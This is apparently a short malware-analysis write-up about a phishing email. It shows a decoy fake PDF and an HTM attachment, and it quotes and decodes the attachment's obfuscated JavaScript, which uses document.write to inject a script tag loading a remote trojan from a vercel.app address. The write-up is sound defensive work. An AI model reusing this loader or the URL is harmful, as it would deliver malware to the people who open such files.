# virus

On 14 Jan 2025 I received the following mail (Thunderbird as a mail program):

![grafik](https://github.com/user-attachments/assets/7bf2c6f3-4468-41a5-b0a2-40a812461fb1)

There are two attachments, a html file and a pdf. The pdf is suspiciously short and actually not a pdf at all.
The html file contains a javascript that downloads the trojan Wacatac.B!ml.

## Analysis

### pdf
Here is the content of the .pdf attachment:

7847834783478347834783478GHSD347R8YUFDJHKFDFGKSJDGFSK786YDFUSGKFSDFSD

I cannot make sense out of it... maybe it is meant to lure people to click the html after they tried the pdf in vain?

### htm
Here is the content of the .htm attachment to the mail:

<script>var _fs=['PHNjcmlwdCBzcmM9Imh0dHBzOi8vZmljdGlvbmFsLWRtay52ZXJjZWwuYXBwLyI+PC9zY3JpcHQ+Cg==',"\x77\x72\x69\x74\x65"]; var h = "dGtlbXBAdC1vbmxpbmUuZGU="; document[_fs[1]](unescape(atob(_fs[0])))</script>


### Meaning

The obfuscation is simple and if decoded it reads as follows:

0th param: <script src="https://fictional-dmk.vercel.app/"></script>

1st param: write

Variable h=(my email address in plain text)

The link to vercel.app loads a script which - according to MS Defender - contains the following trojan: Trojan:Script/Wacatac.B!ml

